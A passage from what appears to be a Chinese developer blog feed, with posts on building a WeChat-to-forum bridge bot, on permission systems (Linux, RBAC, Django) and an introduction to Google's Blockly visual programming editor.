&lt;p&gt;以上三个功能按实现的先后排序。下边分别简述这三个功能的实现&lt;/p&gt;
&lt;h2&gt;微信群与paperweekly论坛的双向通信&lt;/h2&gt;
&lt;p&gt;先贴上实际使用的截图：&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/paperweekly_bbsc5fb270e.png" /&gt;&lt;/p&gt;
&lt;p&gt;这个功能是最初的需求，@张俊同学觉得群聊消息归档不便，不利于深入讨论问题。为了更加高效的分类和管理大家讨论的精华（QA对），想做个bot，与外部论坛打通，便于归档优质的讨论内容。大家群聊的时候只要按照特定格式发言，机器人就能将信息转发到论坛中，用论坛来保存这些讨论信息&lt;/p&gt;
&lt;p&gt;关于最初我们试图解决的问题，@张俊同学在&lt;a href="http://mp.weixin.qq.com/s?__biz=MzIwMTc4ODE0Mw==&amp;amp;mid=2247483940&amp;amp;idx=1&amp;amp;sn=554573482078e34e8909eeaa4030adec&amp;amp;chksm=96e9dda4a19e54b2f518759b214bd503c245991c40a3315a6daa3bb62aa7a455f54d62bdf050&amp;amp;scene=4#wechat_redirect"&gt;PaperWeekly十期总结&lt;/a&gt;的Issue 2里写的很详细，对项目背景有兴趣的同学可以参考&lt;/p&gt;
&lt;p&gt;最初的需求描述如下（来自@张俊）:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/paperweeklyae5df2dd.png" /&gt;  &lt;/p&gt;
&lt;p&gt;我觉得这个想法很有趣，决定一试。用了一个晚上实现了微信与论坛的通信机制（大半时间在熟悉Misago）。次日早起，调试完成，后来也没空去重构代码，&lt;a href="https://github.com/wwj718/paperweekly_forum/blob/master/wechat_bot/paperweeklybot.py"&gt;这部分代码&lt;/a&gt;很丑陋（quick and dirty），欢迎有兴趣的小伙伴帮忙重构&lt;/p&gt;
&lt;h3&gt;思路与实现&lt;/h3&gt;
&lt;p&gt;微信群与paperweekly论坛双向通信问题，实际上是个消息转发问题。消息无非两种流向:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;来自群聊的消息发往论坛&lt;/li&gt;
&lt;li&gt;来自论坛的讨论发往微信群&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;消息的流向可以从这张图里看出:（这张图也描述了项目的结构和数据流）&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="https://raw.githubusercontent.com/wwj718/gif_bed/master/paperweekly_architecture.png" /&gt;&lt;/p&gt;
&lt;p&gt;我们先来看看从微信群发往论坛的消息。&lt;/p&gt;
&lt;p&gt;当微信群的讨论（成员的发言）匹配预先设定的模式时，将触发机器人特定行为，诸如往论坛发帖或回答问题。（这实际是CLI风格，如果你熟悉*nix，会觉得很亲切），所以机器人并没有处理自然语言，更多的是正则匹配，哈哈这有点小尴尬，如@张俊所言&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我们整天都在用机器学习，也都想通过人工智能来改变这个世界，来改变我们的生活，很多时候模型和工具都有，但缺少数据和需求，这次有了数据和需求，我们却无能为力了，感觉有一点点小讽刺&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;机器人士如何把消息发往论坛的呢。我hack了Misago（论坛所用的框架），使其对外提供RESTful API，允许使用http请求来做常见操作（发帖/回复之类）&lt;/p&gt;
&lt;p&gt;以发帖为例，我们跟着消息走，看到的是这样一个流程：微信群里某些消息匹配固定模式，机器人被激活，进而携带着token往论坛发送特定http请求，消息作为请求参数。于是消息从微信群流到了论坛&lt;/p&gt;
&lt;p&gt;接着我们来看看论坛发往微信群的消息。在论坛这块，我hack了源码里的发帖函数，使其具有webhook output功能，你很可能已经用过github的webhook output。当论坛产生帖子时，将对外发起一个web请求（output），外部系统收到请求便知道事件的发生，同时也能获取事件的细节（请求参数），如此一来这个钩子（hook）就把两个异构系统勾连起来。&lt;/p&gt;
&lt;p&gt;webhook是我偏好的异构系统间通信的解决方案，灵活性高，耦合度低。&lt;/p&gt;
&lt;p&gt;我将论坛的web请求发往一个消息服务（我选择kinto，至于原因我在开发文档里也有描述），而在机器人这边，会不断向消息服务轮询。这实际上是经典的发布/订阅模型（至于为何不采用redis和rabbitmq的原因我在开发文档里也有说明）。&lt;/p&gt;
&lt;p&gt;使用发布订阅模型考虑的主要是扩展性，我手头有nlp相关的 QQ群，当时觉得paperweekly的讨论内容很棒，也许其他nlp小组也会感兴趣，使用发布订阅模型，我只要在任何group里（QQ/wechat/telegram/whatapp）放上机器人，就可以订阅paperweekly的动态，我这边做了两个具体实现，其一是在微信群中订阅消息，源码见&lt;a href="https://github.com/wwj718/paperweekly_forum/blob/master/wechat_bot/paperweeklybot.py"&gt;paperweeklybot.py&lt;/a&gt;，其二是QQ群中订阅消息：源码见&lt;a href="https://github.com/wwj718/SmartQQBot"&gt;SmartQQBot&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;至于论坛的选型（最终选择了Misago），大家在群里讨论的结果倾向选择基于python的论坛框架。因为大家对python更为熟悉，方便维护&lt;/p&gt;
&lt;h2&gt;群消息转发&lt;/h2&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/group2ca9e5a54.png" /&gt;&lt;/p&gt;
&lt;p&gt;关于这个需求的背景，引述@张俊的说明（&lt;a href="http://mp.weixin.qq.com/s?__biz=MzIwMTc4ODE0Mw==&amp;amp;mid=2247483940&amp;amp;idx=1&amp;amp;sn=554573482078e34e8909eeaa4030adec&amp;amp;chksm=96e9dda4a19e54b2f518759b214bd503c245991c40a3315a6daa3bb62aa7a455f54d62bdf050&amp;amp;scene=4#wechat_redirect"&gt;PaperWeekly十期总结&lt;/a&gt;）：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一个群很快就到了500人，出现了一个棘手的问题，第二个群的人如果太少，几乎没有讨论意义，所以就想用什么办法可以打通两个群，让两个群的童鞋在同一时空内进行交流&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;@碱馒头同学用了一个中午时间写了群消息转发机器人，我觉得很妙，功能干净利落、十分实用。后来我们觉得两个机器人可以合并成一个，本来计划由馒头兄来实现这块，后来因为我的微信机器人框架和馒头兄不同（我偏好&lt;a href="https://github.com/littlecodersh/ItChat"&gt;itchat&lt;/a&gt;），我就自己用itchat实现了这块&lt;/p&gt;
&lt;p&gt;这部分的实现比较简单，机器人同时在两个群里，当机器人接收到A群消息时，立马转发到B群。至于机器人如何得到群消息，就是微信机器人框架（itchat）做的事了，大家可以自行读文档&lt;/p&gt;
&lt;p&gt;目前只转发文本和表情，下一步准备支持图片/链接分享和跨群@&lt;/p&gt;
&lt;h2&gt;问题检索&lt;/h2&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/qa_bot2af8f456.png" /&gt;&lt;/p&gt;
&lt;p&gt;国庆去白洋淀玩，路上，@张俊同学提到一个有趣的想法：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;有人提问之后，能否直接从quora或者知乎检索相应的答案&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我想到之前玩过的一个叫做&lt;a href="https://github.com/gleitz/howdoi"&gt;howdoi&lt;/a&gt;的项目，于是以此为原型给bot添加了&lt;code&gt;问题检索&lt;/code&gt;的功能,源码见&lt;a href="https://github.com/wwj718/paperweekly_forum/blob/master/wechat_bot/qa_bot.py"&gt;qa_bot.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;目前用户可以在微信群向机器人提问，它会返回stackoverflow里最佳的答案&lt;/p&gt;
&lt;p&gt;原理很简单，howdoi的源码很短，大体思路是利用google的site特性，在指定的站点搜索问题（默认是stackoverflow），得到相关连接，然后打开连接，用pyquery提取内容，返回干净的答案给用户&lt;/p&gt;
&lt;p&gt;从howdoi的原理我们可以看出：实际上&lt;code&gt;问题搜索&lt;/code&gt;是利用了google强大的搜索能力，同时我们看到，这是一个易于扩展的框架，只要改变site对应的网址，理论上可以检索任何网址。最初的需求里提到的知乎和quora当然没有问题，剩下的工作只剩对答案做html清洗。惭愧的是我近来挖的坑太多，业余时间被分散在各个坑里，这个坑暂时还没填，等待小伙伴加入&lt;/p&gt;
&lt;p&gt;因为howdoi不支持中文（用中文从stackoverflow里基本搜不出有价值的东西），后来我们添加了一个翻译层，先做翻译，然后再检索，这样一来，就可以直接在微信群里用中文向机器人提问&lt;/p&gt;
&lt;p&gt;于是你就看到了上边一张图片里的问答&lt;/p&gt;
&lt;h1&gt;下一步&lt;/h1&gt;
&lt;p&gt;接下来除了填完上文提到的坑（todolist）&lt;/p&gt;
&lt;p&gt;还准备先把群消息存下，诸如（groupname，username，content，time），然后pandas做些简单统计，可做的事包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;添加一些小彩蛋，诸如@机器人可以返回该用户的历史参与情况&lt;/li&gt;
&lt;li&gt;统计得出年度热心群友（举个栗子：）,莫当真)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;进一步，可以用bokeh作可视化展示&lt;/p&gt;
&lt;p&gt;当然也可以把语料开放给群成员，供大家使用nlp来做一步的分析和挖掘，诸如挖出&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;近期焦点问题&lt;/li&gt;
&lt;li&gt;冷场话题排行版&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;或者用来训练一只paperweekly风格的机器人 ：）&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 05 Nov 2016 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2016-11-05:paperweekly-forum-bot.html</guid><category>code</category></item><item><title>理解权限系统</title><link>/understand-permission.html</link><description>&lt;blockquote&gt;
&lt;p&gt;现实世界只不过是反射出了更高层次的世界的阴影   --- 柏拉图 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;计算机世界中的许多事物是现实世界的一个投影，现实中所见的许多模式/概念在计算机世界里都能找到&lt;/p&gt;
&lt;p&gt;&lt;code&gt;权限&lt;/code&gt;作为现实世界随处可见的概念，在我们谈论&lt;code&gt;私有制&lt;/code&gt;、&lt;code&gt;所有权&lt;/code&gt;时，时常会谈及权限，在计算机世界中，权限在许多系统中举足轻重&lt;/p&gt;
&lt;p&gt;曾记否，qq里隐身对她可见，怕她看不见，下线又上线，却依旧被视而不见&lt;br /&gt;
曾记否，好好的一个熟人，说做微商就做微商，痛心疾首，火速拉黑&lt;/p&gt;
&lt;p&gt;上述的这些，都是利用权限系统的典型案例，在qq隐身案例中，你对女神隐身可见，实际上是赋予了她可以看到你的隐身状态（真实状态）的权限；当然你也赋予了人家伤害你的权限&lt;/p&gt;
&lt;p&gt;在朋友圈中的案例中，你把微商拉到了&lt;code&gt;黑名单&lt;/code&gt;用户组，这样一来，他们就没有看到你的状态的权限，你也看不到他的刷屏&lt;/p&gt;
&lt;p&gt;下边我们将以几个案例来帮助理解权限系统的概念和设计，这些案例包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;linux操作系统中的权限系统&lt;/li&gt;
&lt;li&gt;微信朋友圈中的权限&lt;/li&gt;
&lt;li&gt;django中的权限机制&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;近期工作中遇到一个系统设计中关于权限的复杂问题（层级组织），本文是我学习权限系统及对此思考的一个小结&lt;/p&gt;
&lt;h1&gt;linux中的权限系统&lt;/h1&gt;
&lt;p&gt;关于权限系统，我们以linux为切入点，它为大多技术人员所熟悉。我们重点关注其中的概念，而对实现细节不做深究&lt;/p&gt;
&lt;p&gt;linux是个多用户操作系统，这每个用户有自己的工作空间(home目录)。就好比多人住在一套公寓里，各自有自己的房间。&lt;/p&gt;
&lt;p&gt;在linux中&lt;code&gt;一切皆文件&lt;/code&gt;，linux鼓励使用文本文件，人和机器能理解文本文件，成为人与机器交流的最好途径。在linux中权限问题往往最终会落到文件的权限上。&lt;/p&gt;
&lt;p&gt;如果我们把文件视为一种资源。那么我们会发现 权限往往围绕这些概念：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户&lt;/li&gt;
&lt;li&gt;用户组（群组）&lt;/li&gt;
&lt;li&gt;资源&lt;/li&gt;
&lt;li&gt;权限类型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果你对上述概念不大熟悉，推荐阅读鸟哥的&lt;a href="http://cn.linux.vbird.org/linux_basic/0210filepermission.php#UserandGroup"&gt;Linux 的文件权限与目录配置&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;上边几个概念中，鸟哥对用户组的解释很棒（意义和功能），推荐一读&lt;/p&gt;
&lt;p&gt;总结来说，Linux一般将文件关联的身份分为三个类别，分别是 owner/group/others，且三种身份各有 read/write/execute 权限&lt;/p&gt;
&lt;p&gt;我们举个本地文件的例子&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ls -l /tmp/test.txt
&lt;span class="c1"&gt;# -rw-r--r--  1 wwj  wheel  235103  9  7 10:26 /tmp/test.txt&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我们在此引用鸟哥文章里的这张图&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://cn.linux.vbird.org/linux_basic/0210filepermission_files/0210filepermission_3.gif" /&gt;&lt;/p&gt;
&lt;p&gt;上述信息表示：文件&lt;code&gt;/tmp/test.txt&lt;/code&gt;是文件(&lt;code&gt;-&lt;/code&gt;)，文件拥有者(wwj)的权限为&lt;code&gt;rw-&lt;/code&gt;(读写)，文件拥有群组(wheel)的权限为&lt;code&gt;r--&lt;/code&gt;(读)，其他人的权限为&lt;code&gt;r--&lt;/code&gt;(读)&lt;/p&gt;
&lt;p&gt;如果你想改变文件属性与权限，可以使用：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;chgrp ：改变文件所属群组&lt;/li&gt;
&lt;li&gt;chown ：改变文件拥有者&lt;/li&gt;
&lt;li&gt;chmod ：改变文件的权限&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;有了群组/资源/用户这些概念，之后我们就可以这样表达权限了: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A用户有资源B的可读权限(r)&lt;/li&gt;
&lt;li&gt;群组X有资源Y的可读权限(r)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;朋友圈中的分组与权限&lt;/h1&gt;
&lt;p&gt;在用户/群组/资源/权限类型的视角下，我们可以这样理解微信朋友圈的分组功能：&lt;/p&gt;
&lt;p&gt;你半夜回家发了一条: &lt;code&gt;今天大学聚会很开心&lt;/code&gt;，为了让没到现场的同学也看到聚会情况，于是附上了聚会照片，你怕被小伙伴诟病为&lt;code&gt;天天晒吃的&lt;/code&gt;，于是决定这条消息只对&lt;code&gt;大学同学组&lt;/code&gt;可见,这样只有在&lt;code&gt;大学同学组(群组)里的同学(用户)才能看到(可读权限)聚会消息(资源)&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;RBAC&lt;/h1&gt;
&lt;p&gt;如果我们进一步抽象，我们便总结出了&lt;code&gt;基于角色的访问控制&lt;/code&gt;(Role-Based Access Control，RBAC)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Who对What进行How操作&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们可以看到这种模式：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;大学同学组里的同学(who)才能看到(how)聚会消息(what)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;RBAC认为权限授权实际上是Who、What、How的问题&lt;/p&gt;
&lt;p&gt;在RBAC模型中，who、what、how构成了访问权限三元组,也就是&lt;code&gt;Who对What进行How的操作&lt;/code&gt;，各个要素的含义如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Who：权限的拥用者或主体（如User、Group、Role）&lt;/li&gt;
&lt;li&gt;What：权限针对的对象或资源（Resource）。&lt;/li&gt;
&lt;li&gt;How：具体的权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;特点&lt;/h3&gt;
&lt;p&gt;模型中概念与实际系统紧密对应。RBAC模型中的角色、用户和许可权等概念都是实际系统实际存在的实体，便于设计者建立现存的或待建系统的RBAC模型&lt;/p&gt;
&lt;h3&gt;分治的思路&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;我们要分割这些问题来讨论（分析的思路/分治）&lt;ul&gt;
&lt;li&gt;用户与角色的指派&lt;/li&gt;
&lt;li&gt;角色与权限的指派&lt;/li&gt;
&lt;li&gt;为定义角色的继承 进行的角色与角色的指派。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上述这些活动都要求把用户和权限联系起来。多数情况下它们最好由不同的管理员或管理角色来做。对角色指派权限是典型的应用管理者的职责（类似元角色）&lt;/p&gt;
&lt;h3&gt;概念解释&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Group：用户组，权限分配的单位与载体。组可以包括组(以实现&lt;code&gt;权限的继承&lt;/code&gt;)（适合用来处理层级问题），也可以包含用户，组内用户继承组的权限。User与Group是多对多的关系。Group可以层次化，以满足不同层级权限控制的要求。 （漂亮解决了我的问题）&lt;ul&gt;
&lt;li&gt;部门Department或组织Organization，都可以对应到Group&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Role：Role和User关系的左右两边都是Many-to-Many关系，角色是为了完成各种工作而创造，用户则依据它的责任和资格来被指派相应的角色，角色配置成其完成任务所需要的最小的权限集&lt;/li&gt;
&lt;li&gt;许可表（PERMISSIONS）包括许可标识、许可名称、受控对象、操作标识。许可表给出了受控对象与操作算子的对应关系。*  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;其他笔记&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;RBAC都是基于关系模型&lt;/li&gt;
&lt;li&gt;资源是受控对象&lt;/li&gt;
&lt;li&gt;RBAC模型支持数据抽象原则和继承概念&lt;/li&gt;
&lt;li&gt;RBAC模型没有提供操作顺序控制机制&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Django中的权限机制&lt;/h1&gt;
&lt;p&gt;这部分主要参考&lt;a href="http://www.jianshu.com/p/01126437e8a4"&gt;Django权限机制的实现&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果你对Django熟悉（不熟悉的话参考你所用web框架的权限机制），可以把这部分理解为以Django为例，解释如何把权限概念用于web项目&lt;/p&gt;
&lt;p&gt;在web应用中，权限机制能够约束用户行为，控制页面的显示内容（想想你的朋友圈和各种论坛的会员机制），也能使API更加安全和灵活（django-rest-framework中）&lt;/p&gt;
&lt;p&gt;Django中用&lt;code&gt;user&lt;/code&gt;, &lt;code&gt;group&lt;/code&gt;和&lt;code&gt;permission&lt;/code&gt;完成了权限机制(和linux很像)，这些概念，我们在前文中阐述清楚了，这个权限机制是将属于model的某个permission赋予user或group，可以理解为全局的权限（ps：如果你需要更细分的权限机制，可以试试：&lt;a href="https://github.com/lukaszb/django-guardian"&gt;django-guardian&lt;/a&gt;）&lt;/p&gt;
&lt;h3&gt;Django的权限项&lt;/h3&gt;
&lt;p&gt;Django用permission（如前文说的许可表）对象存储权限项（How），每个model默认都有三个permission，即add model, change model和delete model，在admin中你可以看到，当然我们也可以手动添加其他权限项，不过值得注意的是权限是针对model的，而不是instance的！&lt;/p&gt;
&lt;p&gt;为一个用户添加权限，既可以在view里做（编码），也可以由管理员（Role）在admin里做（不需要编码）&lt;/p&gt;
&lt;h3&gt;使用权限&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;在view中，使用装饰器来验证权限:&lt;code&gt;@permission_required('car.can_drive')&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;在模板中，当前登录用户的权限存储在模板变量 &lt;code&gt;{{ perms }}&lt;/code&gt; 中&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;todo&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;LDAP  认证和权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;h3&gt;相关概念&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://baike.baidu.com/item/RBAC"&gt;RBAC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.quora.com/What-are-some-good-ways-to-design-permission-systems-in-software"&gt;What are some good ways to design permission systems in software&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Role-based_access_control"&gt;Role-based access control&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/xuhaipeng/article/details/4430446"&gt;角色权限系统的 一些概念&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/painsonline/article/details/7183613/"&gt;RBAC权限管理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cncoders.net/article/10564/"&gt;权限系统---简介&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/20313385"&gt;如何设计网站权限系统&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ibm.com/support/knowledgecenter/zh/ssw_aix_61/com.ibm.aix.security/rbac_use_auths.htm"&gt;RBAC 权限&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/333620/best-practice-for-designing-user-roles-and-permission-system/25643919#25643919"&gt;Best Practice for Designing User Roles and Permission System&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh/%E7%A7%81%E6%9C%89%E5%88%B6"&gt;私有制&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E6%89%80%E6%9C%89%E6%9D%83"&gt;所有权&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;django&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/01126437e8a4"&gt;Django权限机制的实现&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://python.usyiyi.cn/django/topics/auth/default.html"&gt;使用Django认证系统&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikibooks.org/zh/Django/%E7%94%A8%E6%88%B7%E8%AE%A4%E8%AF%81"&gt;维基教科书 Django/用户认证&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://cn.linux.vbird.org/linux_basic/0210filepermission.php"&gt;Linux 的文件权限与目录配置&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://justcode.ikeepstudying.com/2016/08/linux-%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E6%80%BB%E7%BB%93/"&gt;Linux: 系统文件权限总结&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cnblogs.com/frand/archive/2011/01/03/1924987.html"&gt;掌握Linux的用户(组)，权限，文件精妙的三角关系&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 06 Sep 2016 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2016-09-06:understand-permission.html</guid><category>code</category></item><item><title>blockly入门与介绍</title><link>/blockly-overview.html</link><description>&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/blockly9c7fc7e6.png" /&gt;&lt;/p&gt;
&lt;h1&gt;介绍&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://github.com/google/blockly"&gt;blockly&lt;/a&gt;是google发布的可视化编程工具，基于web技术构建。&lt;/p&gt;
&lt;p&gt;在功能/设计上和MIT的儿童编程语言&lt;a href="https://scratch.mit.edu/"&gt;Scratch&lt;/a&gt;类似&lt;/p&gt;
&lt;p&gt;使用blockly的时候，用户可以通过拖曳模块，来构建代码逻辑，过程很像搭积木&lt;/p&gt;
&lt;p&gt;在用户视角下，blockly是一个简单易用的可视化工具，用来生成代码。在开发者视角下，blockly是一个文本框，里边包含了用户输入好的代码。&lt;/p&gt;
&lt;p&gt;代码生成到文本框的过程，就是用户在blockly里拖曳的过程&lt;/p&gt;
&lt;p&gt;更多细节可以参考官方的&lt;a href="https://developers.google.com/blockly/guides/overview"&gt;介绍&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;特性&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;完全是JavaScript，可离线使用&lt;/li&gt;
&lt;li&gt;可生成6门语言：  &lt;ul&gt;
&lt;li&gt;JavaScript&lt;/li&gt;
&lt;li&gt;Python&lt;/li&gt;
&lt;li&gt;PHP&lt;/li&gt;
&lt;li&gt;Dart&lt;/li&gt;
&lt;li&gt;Lua&lt;/li&gt;
&lt;li&gt;XML(XML有时也被视为语言，实际上它更像语法树)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支持主流的浏览器，如：Chrome, Firefox, Safari, Opera, IE&lt;/li&gt;
&lt;li&gt;支持移动设备&lt;/li&gt;
&lt;li&gt;支持许多编程的基本元素，如：变量、函数、数组&lt;/li&gt;
&lt;li&gt;易于扩展自定义的块&lt;/li&gt;
&lt;li&gt;支持多国语言（40+）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;在线体验&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://blockly-demo.appspot.com/static/demos/index.html"&gt;demo&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;文档&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://developers.google.com/blockly/"&gt;文档&lt;/a&gt;：需要梯子&lt;/p&gt;
&lt;h1&gt;技术视角&lt;/h1&gt;
&lt;p&gt;在此我们以技术视角来审视blockly，而不怎么谈论它的教育意义&lt;/p&gt;
&lt;h3&gt;作为编辑器的blockly&lt;/h3&gt;
&lt;p&gt;blockly将自己定位为一个编辑器&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The web-based visual programming editor&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;上边这句话是&lt;a href="https://github.com/google/blockly"&gt;blockly&lt;/a&gt;源码库的自描述&lt;/p&gt;
&lt;p&gt;这个定位十分符合unix哲学：&lt;code&gt;Do one thing&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;而且它确实是实诚的编辑器，而不是那种伪装成编辑器的操作系统（此处有火药味）&lt;/p&gt;
&lt;p&gt;blockly作为编辑器，它的输入为用户的拖曳（拖曳作为一种输入，可以类比为普通编辑器的键盘输入），输出为&lt;code&gt;生成的代码&lt;/code&gt;。使用blockly可以快速打造一个特定领域的可视化 块编程 编辑器&lt;/p&gt;
&lt;p&gt;至于每个积木（block）如何生成代码，代码用于什么用途，blockly则通通不关心，用户自己掌控。&lt;/p&gt;
&lt;p&gt;由于设计上遵循unix哲学，他也将获得unix哲学带来的好处，小而美带来的强大的组合能力。于是围绕blockly的生态十分广阔。涵盖硬件、软件，领域涵盖科研、教育、游戏、玩具等等&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/blocklyf7a63b9c.png" /&gt;&lt;/p&gt;
&lt;h3&gt;使用场景&lt;/h3&gt;
&lt;p&gt;随便列举几个典型的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;以拖曳的方式生成代码，控制硬件&lt;/li&gt;
&lt;li&gt;作为软件的输入（demo中的拖曳出函数并生成图像）&lt;/li&gt;
&lt;li&gt;作为软件的的实时控制界面&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;构建一个Blockly app的步骤&lt;/h3&gt;
&lt;p&gt;按照官方文档&lt;a href="https://developers.google.com/blockly/guides/overview"&gt;overview&lt;/a&gt;的说法，有以下三步：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;集成blockly编辑器&lt;/li&gt;
&lt;li&gt;定义你的app里的功能块（block）&lt;/li&gt;
&lt;li&gt;构建app的其余部分，blockly仅充当代码生成器，你需要决定这些用户生成的代码用于做什么，这也是你的app的核心功能所在&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Blockly的强大之处&lt;/h3&gt;
&lt;p&gt;这部分翻译自&lt;a href="https://developers.google.com/blockly/guides/overview"&gt;官方文档&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Blockly作为一个可视化编程环境，正逐渐流行，那么你如何利用它呢，下边的优势举例可能对你有启发：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可导出的代码: 可以将基于block程序转化为基于普通文本的常规代码（多语言）&lt;/li&gt;
&lt;li&gt;开源： 可以以任何方式定制/使用它，甚至入侵修改它的内核&lt;/li&gt;
&lt;li&gt;可拓展： 通过添加定制化的&lt;code&gt;block关联到你的api上&lt;/code&gt; （将提供服务的部分视为下位机，对外提供api/指令集）&lt;/li&gt;
&lt;li&gt;生产可用：blockly不是一个玩具，你可以用它完成复杂的编程任务，例如写一个可以计算标准差的block&lt;/li&gt;
&lt;li&gt;国际化：blockly支持40多门语言&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;衍生项目&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blockly-games.appspot.com/"&gt;Blockly Game&lt;/a&gt;：拖曳式小游戏&lt;/li&gt;
&lt;li&gt;&lt;a href="https://scratch.mit.edu/developers"&gt;Scratch Blocks&lt;/a&gt;：该项目由Scratch团队使用blockly构建&lt;/li&gt;
